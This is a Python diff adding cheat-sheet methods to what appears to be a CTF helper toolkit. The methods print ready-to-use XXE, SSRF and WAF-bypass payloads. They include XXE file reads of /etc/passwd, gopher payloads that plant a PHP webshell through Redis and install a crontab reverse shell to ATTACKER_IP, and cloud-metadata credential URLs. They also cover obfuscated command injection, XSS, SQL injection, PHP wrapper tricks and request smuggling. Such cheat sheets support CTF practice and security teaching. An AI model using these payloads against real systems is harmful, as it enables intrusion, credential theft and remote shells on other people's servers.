+        lines.append('  <?xml version="1.0" encoding="UTF-7"?>')
+        lines.append("  # Then encode DOCTYPE with UTF-7")
+        lines.append("")
+        lines.append("  # HTML entities in DTD:")
+        lines.append("  # Use &#x25; for % in parameter entities within DTD definitions")
+        lines.append("")
+
+        # 8. SVG XXE
+        lines.append("[8] SVG XXE (image upload vector):")
+        lines.append('  <?xml version="1.0" standalone="yes"?>')
+        lines.append("  <!DOCTYPE svg [")
+        lines.append('    <!ENTITY xxe SYSTEM "file:///etc/hostname">')
+        lines.append("  ]>")
+        lines.append('  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">')
+        lines.append('    <text x="10" y="50" font-size="16">&xxe;</text>')
+        lines.append("  </svg>")
+        lines.append("")
+        lines.append("  # Save as .svg and upload to image processing endpoint")
+        lines.append("  # Also works with: .svgz (gzipped SVG)")
+        lines.append("")
+
+        # 9. Office document XXE
+        lines.append("[9] Office Document XXE (.docx / .xlsx / .pptx):")
+        lines.append("  # Office documents are ZIP archives containing XML files.")
+        lines.append("  # Steps:")
+        lines.append("  # 1. Create a normal .docx file")
+        lines.append("  # 2. Unzip: unzip document.docx -d doc_extracted")
+        lines.append("  # 3. Edit doc_extracted/word/document.xml (or [Content_Types].xml):")
+        lines.append('  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>')
+        lines.append("  <!DOCTYPE foo [")
+        lines.append('    <!ENTITY xxe SYSTEM "file:///etc/passwd">')
+        lines.append("  ]>")
+        lines.append("  <!-- Add &xxe; reference in document body -->")
+        lines.append("  # 4. Re-zip: cd doc_extracted && zip -r ../evil.docx .")
+        lines.append("  # 5. Upload the crafted document")
+        lines.append("")
+        lines.append("  # Also applies to:")
+        lines.append("  #   - .xlsx (Excel): xl/sharedStrings.xml")
+        lines.append("  #   - .pptx (PowerPoint): ppt/presentation.xml")
+        lines.append("  #   - .odt (LibreOffice): content.xml")
+        lines.append("")
+
+        # 10. XInclude
+        lines.append("[10] XInclude Attack (when you don't control full XML):")
+        lines.append('  <foo xmlns:xi="http://www.w3.org/2001/XInclude">')
+        lines.append('    <xi:include parse="text" href="file:///etc/passwd"/>')
+        lines.append("  </foo>")
+        lines.append("  # Useful when input is inserted into existing XML document")
+        lines.append("  # Does not require DOCTYPE declaration")
+
+        return "\n".join(lines)
+
+    # ========== SSRF Payload 速查表 ==========
+
+    def ssrf_payload_helper(self, input: str = "") -> str:
+        """SSRF (Server-Side Request Forgery) payload cheat sheet for CTF challenges."""
+        title = t('web.ssrf_payload_helper')
+        lines: list[str] = [f"=== {title} ===\n"]
+
+        # 1. Basic SSRF
+        lines.append("[1] Basic SSRF Payloads:")
+        lines.append("  http://127.0.0.1")
+        lines.append("  http://localhost")
+        lines.append("  http://127.0.0.1:80")
+        lines.append("  http://127.0.0.1:8080")
+        lines.append("  http://127.0.0.1:443")
+        lines.append("  http://127.0.0.1:22")
+        lines.append("  http://127.0.0.1:3306   # MySQL")
+        lines.append("  http://127.0.0.1:6379   # Redis")
+        lines.append("  http://127.0.0.1:27017  # MongoDB")
+        lines.append("  http://127.0.0.1:9200   # Elasticsearch")
+        lines.append("  http://127.0.0.1:11211  # Memcached")
+        lines.append("")
+
+        # 2. IP bypass
+        lines.append("[2] IP Address Bypass:")
+        lines.append("  # Decimal:")
+        lines.append("  http://2130706433          # = 127.0.0.1")
+        lines.append("  http://0x7f000001          # Hex = 127.0.0.1")
+        lines.append("  http://017700000001        # Octal = 127.0.0.1")
+        lines.append("")
+        lines.append("  # Shorthand:")
+        lines.append("  http://127.1               # Short for 127.0.0.1")
+        lines.append("  http://127.0.1             # Short for 127.0.0.1")
+        lines.append("  http://0                   # = 0.0.0.0 (all interfaces)")
+        lines.append("")
+        lines.append("  # Octal notation:")
+        lines.append("  http://0177.0.0.1          # = 127.0.0.1")
+        lines.append("  http://0177.0000.0000.0001 # = 127.0.0.1")
+        lines.append("")
+        lines.append("  # Hex notation (dotted):")
+        lines.append("  http://0x7f.0x0.0x0.0x1    # = 127.0.0.1")
+        lines.append("  http://0x7f.0.0.1")
+        lines.append("")
+        lines.append("  # Mixed notation:")
+        lines.append("  http://0x7f.0.0.0x1")
+        lines.append("  http://0177.0.0.0x1")
+        lines.append("")
+        lines.append("  # Special addresses:")
+        lines.append("  http://0.0.0.0")
+        lines.append("  http://spoofed.burpcollaborator.net  # Resolves to 127.0.0.1")
+        lines.append("  http://localtest.me                  # Resolves to 127.0.0.1")
+        lines.append("  http://customer1.app.localhost.my.company.127.0.0.1.nip.io")
+        lines.append("")
+
+        # 3. DNS Rebinding
+        lines.append("[3] DNS Rebinding:")
+        lines.append("  # Set up a DNS server that alternates between:")
+        lines.append("  #   - Your public IP (passes validation)")
+        lines.append("  #   - 127.0.0.1 (actual request hits internal service)")
+        lines.append("")
+        lines.append("  # Tools:")
+        lines.append("  #   - rbndr.us: http://a.b.rbndr.us (A=public, B=127.0.0.1)")
+        lines.append("  #     Example: http://7f000001.7f000001.rbndr.us")
+        lines.append("  #   - Singularity of Origin: https://github.com/nccgroup/singularity")
+        lines.append("  #   - Custom DNS server with short TTL (e.g., 0)")
+        lines.append("")
+
+        # 4. Gopher protocol
+        lines.append("[4] Gopher Protocol (attack internal services):")
+        lines.append("")
+        lines.append("  # Redis - Write webshell:")
+        lines.append("  gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a")
+        lines.append("  %0a%0a<?php eval($_POST[1]);?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a")
+        lines.append("  $3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a")
+        lines.append("  *4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a")
+        lines.append("  $9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a")
+        lines.append("")
+        lines.append("  # Redis - Reverse shell via crontab:")
+        lines.append("  gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a")
+        lines.append("  $58%0d%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1%0a%0d%0a")
+        lines.append("  *4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a")
+        lines.append("  $16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a")
+        lines.append("  $10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a")
+        lines.append("")
+        lines.append("  # MySQL (unauthenticated):")
+        lines.append("  gopher://127.0.0.1:3306/_<mysql_packet_hex>")
+        lines.append("  # Use Gopherus tool: https://github.com/tarunkant/Gopherus")
+        lines.append("")
+        lines.append("  # FastCGI (PHP-FPM):")
+        lines.append("  gopher://127.0.0.1:9000/_<fastcgi_packet>")
+        lines.append("  # Use Gopherus: python gopherus.py --exploit fastcgi")
+        lines.append("")
+        lines.append("  # SMTP:")
+        lines.append("  gopher://127.0.0.1:25/_HELO%20attacker%0d%0aMAIL%20FROM:<a@a.com>%0d%0a")
+        lines.append("  RCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0a...")
+        lines.append("")
+
+        # 5. Dict protocol
+        lines.append("[5] Dict Protocol:")
+        lines.append("  dict://127.0.0.1:6379/info       # Redis info")
+        lines.append("  dict://127.0.0.1:6379/keys *     # List Redis keys")
+        lines.append("  dict://127.0.0.1:11211/stats     # Memcached stats")
+        lines.append("")
+
+        # 6. File protocol
+        lines.append("[6] File Protocol:")
+        lines.append("  file:///etc/passwd")
+        lines.append("  file:///etc/shadow")
+        lines.append("  file:///etc/hosts")
+        lines.append("  file:///proc/self/environ")
+        lines.append("  file:///proc/self/cmdline")
+        lines.append("  file:///proc/net/tcp       # Open TCP connections")
+        lines.append("  file:///proc/net/arp        # ARP table for internal IPs")
+        lines.append("  file:///flag")
+        lines.append("  file:///flag.txt")
+        lines.append("  file:///C:/Windows/win.ini  # Windows")
+        lines.append("")
+
+        # 7. URL tricks
+        lines.append("[7] URL Trick Bypass (@, #, ?):")
+        lines.append("  # @ symbol (credentials in URL):")
+        lines.append("  http://attacker.com@127.0.0.1")
+        lines.append("  http://127.0.0.1@attacker.com  # Confuse URL parser")
+        lines.append("")
+        lines.append("  # Fragment (#):")
+        lines.append("  http://expected-host#@127.0.0.1")
+        lines.append("")
+        lines.append("  # Query string (?):")
+        lines.append("  http://expected-host?url=http://127.0.0.1")
+        lines.append("")
+        lines.append("  # Backslash (parser inconsistency):")
+        lines.append("  http://expected-host\\@127.0.0.1")
+        lines.append("")
+        lines.append("  # Enclosed alphanumerics:")
+        lines.append("  http://\\u24DB\\u24C4\\u24B8\\u24B6\\u24C1\\u24BD\\u24C4\\u24C8\\u24C9  # = localhost")
+        lines.append("")
+        lines.append("  # Whitespace / control chars:")
+        lines.append("  http://127.0.0.1%09  # Tab")
+        lines.append("  http://127.0.0.1%00  # Null byte")
+        lines.append("")
+
+        # 8. 302 Redirect bypass
+        lines.append("[8] 302 Redirect Bypass:")
+        lines.append("  # Host a redirect page on your server:")
+        lines.append("  # redirect.php:")
+        lines.append("  <?php header('Location: http://127.0.0.1:6379/'); ?>")
+        lines.append("")
+        lines.append("  # Python redirect server:")
+        lines.append("  from flask import Flask, redirect")
+        lines.append("  app = Flask(__name__)")
+        lines.append("  @app.route('/redir')")
+        lines.append("  def redir(): return redirect('http://127.0.0.1:80/')")
+        lines.append("")
+        lines.append("  # Useful when:")
+        lines.append("  #   - Server validates domain but follows redirects")
+        lines.append("  #   - Whitelist check on initial URL only")
+        lines.append("")
+
+        # 9. IPv6 bypass
+        lines.append("[9] IPv6 Bypass:")
+        lines.append("  http://[::1]                    # IPv6 loopback = 127.0.0.1")
+        lines.append("  http://[::1]:80")
+        lines.append("  http://[::ffff:127.0.0.1]       # IPv4-mapped IPv6")
+        lines.append("  http://[0:0:0:0:0:ffff:127.0.0.1]")
+        lines.append("  http://[::ffff:7f00:1]          # Hex form")
+        lines.append("  http://[0000::1]")
+        lines.append("  http://[::1%25]                  # With zone ID")
+        lines.append("")
+
+        # 10. Numeral system bypass
+        lines.append("[10] Numeral System Bypass (IP conversion):")
+        lines.append("  # 127.0.0.1 in different formats:")
+        lines.append("  # Decimal:     2130706433")
+        lines.append("  # Hex:         0x7f000001")
+        lines.append("  # Octal:       017700000001")
+        lines.append("  # Binary:      01111111000000000000000000000001")
+        lines.append("")
+        lines.append("  # Python helper:")
+        lines.append("  import struct, socket")
+        lines.append("  ip = '127.0.0.1'")
+        lines.append("  decimal = struct.unpack('!I', socket.inet_aton(ip))[0]  # 2130706433")
+        lines.append("  hex_ip = hex(decimal)    # 0x7f000001")
+        lines.append("  oct_ip = oct(decimal)    # 0o17700000001")
+        lines.append("")
+        lines.append("  # Per-octet conversion (127.0.0.1):")
+        lines.append("  # Octet hex:   0x7f.0x00.0x00.0x01")
+        lines.append("  # Octet oct:   0177.0000.0000.0001")
+        lines.append("")
+
+        # 11. Cloud metadata endpoints
+        lines.append("[11] Cloud Metadata Endpoints:")
+        lines.append("  # AWS:")
+        lines.append("  http://169.254.169.254/latest/meta-data/")
+        lines.append("  http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+        lines.append("  http://169.254.169.254/latest/user-data")
+        lines.append("")
+        lines.append("  # GCP:")
+        lines.append("  http://metadata.google.internal/computeMetadata/v1/")
+        lines.append("  # Header required: Metadata-Flavor: Google")
+        lines.append("")
+        lines.append("  # Azure:")
+        lines.append("  http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+        lines.append("  # Header required: Metadata: true")
+        lines.append("")
+        lines.append("  # DigitalOcean:")
+        lines.append("  http://169.254.169.254/metadata/v1/")
+        lines.append("")
+        lines.append("  # Alibaba Cloud:")
+        lines.append("  http://100.100.100.200/latest/meta-data/")
+
+        return "\n".join(lines)
+
+    # ========== WAF 绕过速查表 ==========
+
+    def waf_bypass_helper(self, input: str = "") -> str:
+        """WAF (Web Application Firewall) bypass cheat sheet for CTF challenges."""
+        title = t('web.waf_bypass_helper')
+        lines: list[str] = [f"=== {title} ===\n"]
+
+        # ==================== 1. SQL Injection Bypass ====================
+        lines.append("=" * 50)
+        lines.append("[1] SQL Injection WAF Bypass")
+        lines.append("=" * 50)
+        lines.append("")
+
+        lines.append("  [1.1] Case Variation:")
+        lines.append("    SeLeCt, UnIoN, FrOm, WheRe")
+        lines.append("    uNiOn SeLeCt 1,2,3--")
+        lines.append("")
+
+        lines.append("  [1.2] Double Write (when keyword is deleted once):")
+        lines.append("    UNIunionON SELselectECT")
+        lines.append("    selselectect => after str_replace('select','') => select")
+        lines.append("")
+
+        lines.append("  [1.3] Comment Insertion:")
+        lines.append("    UN/**/ION SEL/**/ECT")
+        lines.append("    /*!UNION*/ /*!SELECT*/")
+        lines.append("    /*!50000UNION*/ /*!50000SELECT*/  # MySQL version comment")
+        lines.append("    UN/**/I/**/ON/**/SE/**/LE/**/CT")
+        lines.append("")
+
+        lines.append("  [1.4] Encoding Bypass:")
+        lines.append("    # URL encoding:")
+        lines.append("    %55%4e%49%4f%4e %53%45%4c%45%43%54  # UNION SELECT")
+        lines.append("    # Double URL encoding:")
+        lines.append("    %2555%254e%2549%254f%254e  # UNION")
+        lines.append("    # Unicode encoding:")
+        lines.append("    %u0055%u004e%u0049%u004f%u004e  # UNION")
+        lines.append("    # Hex encoding:")
+        lines.append("    0x756e696f6e  # 'union'")
+        lines.append("")
+
+        lines.append("  [1.5] Equivalent Substitution:")
+        lines.append("    # Space bypass:")
+        lines.append("    UNION%09SELECT          # Tab")
+        lines.append("    UNION%0aSELECT          # Newline")
+        lines.append("    UNION%0bSELECT          # Vertical tab")
+        lines.append("    UNION%0cSELECT          # Form feed")
+        lines.append("    UNION%0dSELECT          # Carriage return")
+        lines.append("    UNION%a0SELECT           # Non-breaking space")
+        lines.append("    UNION/**/SELECT          # Comment as space")
+        lines.append("    UNION(SELECT(1),(2),(3)) # Parentheses")
+        lines.append("")
+        lines.append("    # Keyword replacement:")
+        lines.append("    OR  => ||     AND => &&")
+        lines.append("    =   => LIKE, REGEXP, RLIKE, <>, !=")
+        lines.append("    ' ' => %09, %0a, %0b, %0c, %0d, %a0, /**/")
+        lines.append("    ,   => JOIN, CASE WHEN, OFFSET (no comma union)")
+        lines.append("    SELECT => (TABLE t LIMIT 1)")
+        lines.append("")
+
+        lines.append("  [1.6] Inline Comments (MySQL):")
+        lines.append("    /*!UNION*/ /*!SELECT*/ /*!1*/,/*!2*/,/*!3*/--")
+        lines.append("    /*!50000SELECT*/ => executes if MySQL version >= 5.0")
+        lines.append("")
+
+        lines.append("  [1.7] No-comma UNION SELECT:")
+        lines.append("    UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c")
+        lines.append("    UNION SELECT 1 LIMIT 1 OFFSET 1")
+        lines.append("")
+
+        lines.append("  [1.8] String without quotes:")
+        lines.append("    SELECT CHAR(97,100,109,105,110)  # 'admin'")
+        lines.append("    SELECT 0x61646d696e              # 'admin' hex")
+        lines.append("    SELECT CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))")
+        lines.append("")
+
+        # ==================== 2. XSS Bypass ====================
+        lines.append("=" * 50)
+        lines.append("[2] XSS WAF Bypass")
+        lines.append("=" * 50)
+        lines.append("")
+
+        lines.append("  [2.1] Encoding Bypass:")
+        lines.append("    # HTML entity:")
+        lines.append("    <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>")
+        lines.append("    # Hex encoding:")
+        lines.append("    <img src=x onerror=\\x61\\x6c\\x65\\x72\\x74(1)>")
+        lines.append("    # Unicode:")
+        lines.append("    <img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>")
+        lines.append("    # Base64 in data URI:")
+        lines.append("    <a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>")
+        lines.append("    # URL encoding in javascript: URI:")
+        lines.append("    <a href=javascript:%61%6c%65%72%74(1)>click</a>")
+        lines.append("")
+
+        lines.append("  [2.2] Tag Mutation:")
+        lines.append("    <ScRiPt>alert(1)</ScRiPt>")
+        lines.append("    <scr<script>ipt>alert(1)</scr</script>ipt>")
+        lines.append("    <SCRIPT>alert(1)</SCRIPT>")
+        lines.append("    <script/src=data:,alert(1)>")
+        lines.append('    <script\\x20type="text/javascript">alert(1)</script>')
+        lines.append('    <script\\x0dtype="text/javascript">alert(1)</script>')
+        lines.append("")
+
+        lines.append("  [2.3] Event Handlers:")
+        lines.append("    <img src=x onerror=alert(1)>")
+        lines.append("    <svg onload=alert(1)>")
+        lines.append("    <body onload=alert(1)>")
+        lines.append("    <input onfocus=alert(1) autofocus>")
+        lines.append("    <marquee onstart=alert(1)>")
+        lines.append("    <video src=x onerror=alert(1)>")
+        lines.append("    <details open ontoggle=alert(1)>")
+        lines.append("    <audio src=x onerror=alert(1)>")
+        lines.append("    <object data=javascript:alert(1)>")
+        lines.append("    <iframe src=javascript:alert(1)>")
+        lines.append("    <math><mtext><table><mglyph><svg><mtext><textarea><path id=x onerror=alert(1)>")
+        lines.append("")
+
+        lines.append("  [2.4] SVG / MathML Namespace:")
+        lines.append("    <svg><script>alert(1)</script></svg>")
+        lines.append("    <math><mtext><script>alert(1)</script></mtext></math>")
+        lines.append("    <svg><foreignObject><body onload=alert(1)></foreignObject></svg>")
+        lines.append("    <svg><animate onbegin=alert(1) attributeName=x>")
+        lines.append("    <svg><set onbegin=alert(1) attributename=x>")
+        lines.append("")
+
+        lines.append("  [2.5] alert() Bypass:")
+        lines.append("    confirm(1)")
+        lines.append("    prompt(1)")
+        lines.append("    window['al'+'ert'](1)")
+        lines.append("    self['al'+'ert'](1)")
+        lines.append("    top['al'+'ert'](1)")
+        lines.append("    eval('al'+'ert(1)')")
+        lines.append("    setTimeout('alert(1)')")
+        lines.append("    setInterval('alert(1)')")
+        lines.append("    Function('alert(1)')()")
+        lines.append("    [].constructor.constructor('alert(1)')()")
+        lines.append("    Reflect.apply(alert, null, [1])")
+        lines.append("")
+
+        # ==================== 3. Command Injection Bypass ====================
+        lines.append("=" * 50)
+        lines.append("[3] Command Injection WAF Bypass")
+        lines.append("=" * 50)
+        lines.append("")
+
+        lines.append("  [3.1] Variable Concatenation:")
+        lines.append("    c${x}at /etc/passwd      # $x is empty => cat")
+        lines.append("    c''at /etc/passwd         # Empty quote => cat")
+        lines.append('    c""at /etc/passwd         # Empty double quote => cat')
+        lines.append("    c\\at /etc/passwd          # Backslash => cat")
+        lines.append("    /???/c?t /???/p?s?w?      # Wildcard => /bin/cat /etc/passwd")
+        lines.append("")
+
+        lines.append("  [3.2] $IFS (Internal Field Separator):")
+        lines.append("    cat$IFS/etc/passwd")
+        lines.append("    cat${IFS}/etc/passwd")
+        lines.append("    cat$IFS$9/etc/passwd      # $9 is empty")
+        lines.append("    {cat,/etc/passwd}          # Brace expansion")
+        lines.append("    X=$'cat\\x20/etc/passwd'&&$X  # $'' quoting with hex")
+        lines.append("")
+
+        lines.append("  [3.3] Backtick / $() Substitution:")
+        lines.append("    `cat /etc/passwd`")
+        lines.append("    $(cat /etc/passwd)")
+        lines.append("    `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`")
+        lines.append("")
+
+        lines.append("  [3.4] Hex / Octal / Base64:")
+        lines.append("    # Hex:")
+        lines.append("    echo -e '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64' | sh")
+        lines.append("    $(printf '\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67')")
+        lines.append("")
+        lines.append("    # Octal:")
+        lines.append("    $(printf '\\143\\141\\164\\40\\57\\145\\164\\143\\57\\160\\141\\163\\163\\167\\144')")
+        lines.append("")
+        lines.append("    # Base64:")
+        lines.append("    echo Y2F0IC9mbGFn | base64 -d | sh")
+        lines.append("    bash<<<$(echo Y2F0IC9mbGFn | base64 -d)")
+        lines.append("")
+
+        lines.append("  [3.5] Alternative Commands:")
+        lines.append("    # cat alternatives:")
+        lines.append("    tac /flag          # Reverse cat")
+        lines.append("    nl /flag           # Number lines")
+        lines.append("    head /flag")
+        lines.append("    tail /flag")
+        lines.append("    more /flag")
+        lines.append("    less /flag")
+        lines.append("    sort /flag")
+        lines.append("    uniq /flag")
+        lines.append("    rev /flag | rev")
+        lines.append("    xxd /flag")
+        lines.append("    od -c /flag")
+        lines.append("    strings /flag")
+        lines.append("    paste /flag")
+        lines.append("    diff /flag /dev/null")
+        lines.append("    curl file:///flag")
+        lines.append("    vim /flag -c ':w !cat' -c ':q!'")
+        lines.append("")
+
+        lines.append("  [3.6] Separator Bypass:")
+        lines.append("    ;    # Command separator")
+        lines.append("    |    # Pipe")
+        lines.append("    ||   # OR")
+        lines.append("    &&   # AND")
+        lines.append("    &    # Background")
+        lines.append("    %0a  # Newline (\\n)")
+        lines.append("    %0d  # Carriage return (\\r)")
+        lines.append("    \\n   # Newline in some contexts")
+        lines.append("")
+
+        # ==================== 4. File Inclusion Bypass ====================
+        lines.append("=" * 50)
+        lines.append("[4] File Inclusion WAF Bypass")
+        lines.append("=" * 50)
+        lines.append("")
+
+        lines.append("  [4.1] PHP Pseudo-Protocols:")
+        lines.append("    php://filter/convert.base64-encode/resource=flag.php")
+        lines.append("    php://filter/read=string.rot13/resource=flag.php")
+        lines.append("    php://filter/convert.iconv.utf-8.utf-16/resource=flag.php")
+        lines.append("    php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php")
+        lines.append("    php://input  # POST body as include content")
+        lines.append("    data://text/plain,<?php system('cat /flag');?>")
+        lines.append("    data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==")
+        lines.append("    phar://uploads/shell.jpg/shell.php")
+        lines.append("    zip://uploads/shell.jpg%23shell.php")
+        lines.append("    compress.zlib://uploads/shell.jpg")
+        lines.append("")
+
+        lines.append("  [4.2] Double URL Encoding:")
+        lines.append("    ../ => %2e%2e%2f => %252e%252e%252f")
+        lines.append("    ..%c0%af  # Overlong UTF-8 encoding of /")
+        lines.append("    ..%ef%bc%8f  # Fullwidth /")
+        lines.append("    ..%c1%9c  # Overlong UTF-8 encoding of \\")
+        lines.append("")
+
+        lines.append("  [4.3] Path Truncation (PHP < 5.3):")
+        lines.append("    # Null byte:")
+        lines.append("    /etc/passwd%00.php")
+        lines.append("    /etc/passwd\\0.php")
+        lines.append("")
+        lines.append("    # Long path truncation (exceed OS path limit):")
+        lines.append("    /etc/passwd/./././././...  (repeat to > 4096 chars on Linux)")
+        lines.append("    /etc/passwd.......  (repeat to > 256 chars on Windows)")
+        lines.append("")
+
+        lines.append("  [4.4] Filter Chain (PHP >= 7.0):")
+        lines.append("    # php://filter chains to generate arbitrary content:")
+        lines.append("    php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...")
+        lines.append("    # Tool: https://github.com/synacktiv/php_filter_chain_generator")
+        lines.append("    # python3 php_filter_chain_generator.py --chain '<?php system(\"cat /flag\");?>'")
+        lines.append("")
+
+        # ==================== 5. General WAF Bypass ====================
+        lines.append("=" * 50)
+        lines.append("[5] General WAF Bypass Techniques")
+        lines.append("=" * 50)
+        lines.append("")
+
+        lines.append("  [5.1] Chunked Transfer Encoding:")
+        lines.append("    # Split payload across chunks to evade pattern matching:")
+        lines.append("    Transfer-Encoding: chunked")
+        lines.append("")
+        lines.append("    4")
+        lines.append("    UNIO")
+        lines.append("    6")
+        lines.append("    N SELE")
+        lines.append("    2")
+        lines.append("    CT")
+        lines.append("    0")
+        lines.append("    ")
+        lines.append("")
+
+        lines.append("  [5.2] HTTP Parameter Pollution (HPP):")
+        lines.append("    # Different servers handle duplicate params differently:")
+        lines.append("    # PHP/Apache:   last value   => ?id=1&id=UNION+SELECT")
+        lines.append("    # ASP/IIS:      all values   => ?id=1,UNION+SELECT")
+        lines.append("    # JSP/Tomcat:   first value  => ?id=UNION+SELECT&id=1")
+        lines.append("    # Python/Flask: first value")
+        lines.append("")
+        lines.append("    ?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3--")
+        lines.append("")
+
+        lines.append("  [5.3] Content-Type Manipulation:")
+        lines.append("    # WAF may only inspect specific Content-Types:")
+        lines.append("    Content-Type: application/x-www-form-urlencoded  # Normal")
+        lines.append("    Content-Type: multipart/form-data               # May bypass WAF")
+        lines.append("    Content-Type: application/json                  # JSON format")
+        lines.append("    Content-Type: text/plain                        # Plain text")
+        lines.append("    Content-Type: application/xml                   # XML format")
+        lines.append("")
+        lines.append("    # Example: JSON body bypass")
+        lines.append('    {"id": "1 UNION SELECT 1,2,3--"}')
+        lines.append("")
+
+        lines.append("  [5.4] Unicode Normalization:")
+        lines.append("    # Some WAFs don't handle Unicode normalization:")
+        lines.append("    # Fullwidth characters (U+FF01 - U+FF5E):")
+        lines.append("    \\uff47 => g, \\uff45 => e, \\uff54 => t")
+        lines.append("    # Combining characters:")
+        lines.append("    e\\u0301 => e (with accent, may normalize to e)")
+        lines.append("")
+
+        lines.append("  [5.5] HTTP Method Override:")
+        lines.append("    # Try different HTTP methods:")
+        lines.append("    X-HTTP-Method-Override: PUT")
+        lines.append("    X-HTTP-Method: DELETE")
+        lines.append("    X-Method-Override: PATCH")
+        lines.append("")
+
+        lines.append("  [5.6] Request Line Bypass:")
+        lines.append("    # Absolute URI in request line:")
+        lines.append("    GET http://target.com/path HTTP/1.1")
+        lines.append("    # HTTP/0.9 (no headers):")
+        lines.append("    GET /path")
+        lines.append("    # Path with redundant slashes:")
+        lines.append("    GET //path///to////resource")
+        lines.append("")
+
+        lines.append("  [5.7] Header Injection / Smuggling:")
+        lines.append("    # Multiple Content-Length headers:")
+        lines.append("    Content-Length: 0")
+        lines.append("    Content-Length: 42")
+        lines.append("")
+        lines.append("    # Transfer-Encoding obfuscation:")
+        lines.append("    Transfer-Encoding: chunked")
+        lines.append("    Transfer-Encoding : chunked          # Space before colon")
+        lines.append("    Transfer-Encoding: xchunked")
+        lines.append("    Transfer-Encoding: chunked-false")
+        lines.append("    Transfer-Encoding:\\tchunked           # Tab")
+        lines.append("    Transfer-Encoding:\\x0bchunked         # Vertical tab")
+        lines.append("")
+
+        lines.append("  [5.8] IP-based Bypass:")
+        lines.append("    # If WAF is IP-based, try these headers:")
+        lines.append("    X-Forwarded-For: 127.0.0.1")
+        lines.append("    X-Real-IP: 127.0.0.1")
+        lines.append("    X-Originating-IP: 127.0.0.1")
+        lines.append("    X-Client-IP: 127.0.0.1")
+        lines.append("    True-Client-IP: 127.0.0.1")
+        lines.append("    CF-Connecting-IP: 127.0.0.1         # Cloudflare")
+        lines.append("    X-Forwarded-Host: target.com")
+
+        return "\n".join(lines)
